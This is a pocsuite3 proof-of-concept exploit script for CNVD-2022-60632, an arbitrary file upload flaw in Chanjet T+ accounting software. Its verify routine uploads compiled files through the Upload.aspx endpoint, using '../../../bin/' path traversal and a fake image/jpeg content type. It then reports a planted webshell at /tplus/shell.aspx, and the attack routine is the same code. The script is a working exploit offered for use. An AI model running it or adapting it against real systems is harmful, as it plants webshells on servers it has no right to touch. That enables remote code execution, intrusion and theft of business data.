from collections import OrderedDict
from urllib.parse import urljoin
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
import json
import os


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    author = ['']  # PoC作者的大名
    vulDate = '2022-09-23'  # 漏洞公开的时间,不知道就写今天
    createDate = '2022-09-23'  # 编写 PoC 的日期
    updateDate = '2022-09-23'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '畅捷通T+ 任意文件上传'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '畅捷通T+'  # 漏洞应用名称
    appVersion = '''畅捷通T+单机版<=17.0且使用IIS10.0以下版本'''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        CNVD-2022-60632 畅捷通T+ 任意文件上传漏洞
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        path = "/tplus/SM/SetupAccount/Upload.aspx?preload=1"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        }
        url = self.url + path
        filename = os.listdir('bin')
        filename_compiled = filename[0]
        filename_dll = filename[1]
        try:
            files = {"File1": ("../../../bin/"+filename_compiled+"",open('bin/'+filename_compiled, "rb"), "image/jpeg")}
            resq_0 = requests.post(url=url, headers=headers, files=files, timeout=1000)
            files = {"File1": ("../../../bin/"+filename_dll+"",open('bin/'+filename_dll, "rb"), "image/jpeg")}
            resq_1 = requests.post(url=url, headers=headers, files=files, timeout=1000)
            if resq_0.status_code == 200 and resq_1.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['shell'] = self.url + '/tplus/shell.aspx?preload=1'
        except Exception as e:
            print(e)
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(POC)
